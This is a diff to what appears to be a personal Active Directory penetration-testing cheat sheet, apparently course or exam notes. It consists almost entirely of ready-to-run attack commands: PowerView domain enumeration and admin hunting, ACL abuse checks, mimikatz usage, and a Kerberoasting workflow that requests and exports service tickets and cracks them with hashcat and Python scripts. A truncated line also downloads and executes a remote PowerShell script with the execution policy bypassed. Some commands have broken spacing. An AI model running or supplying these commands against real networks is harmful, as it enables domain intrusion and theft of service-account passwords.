@@ -36,10 +36,16 @@ Get-NetGroup # enumerate domain groups
 Get-NetGroup "group name" # information from specific group
 Get-NetComputer # enumerate the computer objects in the domain
 Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
+Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
+Convert-SidToName <sid/objsid> # converting SID/ObjSID to name
+
+#Key commands for enumerations
+Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
 Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
 Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
-Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
-Convert-SidToName <sid/objsid> # converting SID/ObjSID to name 
+Invoke-UserHunter
+Invoke-Portscan -Hosts sql01
+
 
 # Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
 Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights 
@@ -254,7 +260,7 @@ mimikatz # misc::cmd
 mimikatz # misc::cmd whoami
 ```
 
-#Kerberoasting
+# Kerberoasting
 <aside>
 Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
 Kerberoasting requires a valid domain account.
@@ -271,3 +277,20 @@ powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('
 hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
         hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
 ```
+
+# manual [Kerberoasting] effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script (Kerberoasting)
+
+```bash
+#get SPN
+impacket-GetUserSPNs exam.com/apachesvc -dc-ip 172.16.1xx.100
+
+#requesting TGS ticket, i.e. .kirbi
+PS C:\Users\offsec> Add-Type -AssemblyName System. IdentityModel
+PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'SPN'
+        PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+mimikatz # kerberos :: list /export
+
+#crack hash using tgsrepcrack.py
+/usr/share/kerberoast/tgsrepcrack.py wordlist.txt 2-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
+#crack hash using kirbi2john.py
+python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
